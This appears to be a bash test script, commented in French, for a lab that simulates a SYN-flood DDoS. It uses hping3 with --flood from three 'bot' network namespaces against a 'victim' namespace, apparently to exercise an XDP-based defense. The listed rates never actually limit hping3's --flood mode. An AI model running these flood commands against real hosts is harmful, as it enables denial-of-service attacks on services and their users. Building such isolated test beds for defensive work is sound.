#!/bin/bash

# Paramètres
VICTIM_NS="victim"
VICTIM_IP="10.0.0.1"
BOT_COUNT=3
BASE_BOT_NS="bot"
TARGET_PORT=80
LOG_DIR="./logs"
TEST_DURATION=30  # Durée en secondes pour chaque test

# Couleurs
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

# Créer un dossier pour les logs
mkdir -p "$LOG_DIR"

# Nettoyage complet (fin du script ou interruption)
cleanup() {
    echo -e "${YELLOW}[*] Nettoyage final...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}
trap cleanup SIGINT SIGTERM

# Fonction pour arrêter les attaques entre les tests sans quitter le script
stop_attack() {
    echo -e "${YELLOW}[*] Arrêt de l'attaque en cours...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    PIDS=()
}

# Vérification des dépendances
for cmd in ip hping3; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Erreur : $cmd est requis.${NC}"
        exit 1
    fi
done

# === Test 4 : Variation d’intensité (10k, 100k, 1M pps simulé) ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim tcp port 80

#--flood inonde et désactive l'affichage.
#L'absence d'affichage ne signifie pas que rien n’est envoyé.
#Le terminal reste silencieux pour des raisons de performance.
#A regarder avec programme python et maps xdp

echo -e "${YELLOW}[4/5] Test : Variation d’intensité${NC}"
RATES=(100 1000 10000)
for RATE in "${RATES[@]}"; do
    echo -e "${GREEN}[*] Envoi à environ $RATE pps (simulation)${NC}"
    PIDS=()
    for i in $(seq 1 $BOT_COUNT); do
        NS="${BASE_BOT_NS}${i}"
        ip netns exec "$NS" hping3 -S --flood -p "$TARGET_PORT" "$VICTIM_IP" > "$LOG_DIR/saturation_${RATE}_pps_${NS}.log" 2>&1 &
        PIDS+=($!)
    done
    sleep "$TEST_DURATION"
    stop_attack
done

sleep "$TEST_DURATION"
stop_attack

echo -e "${GREEN}[✓] Test 4 terminé."
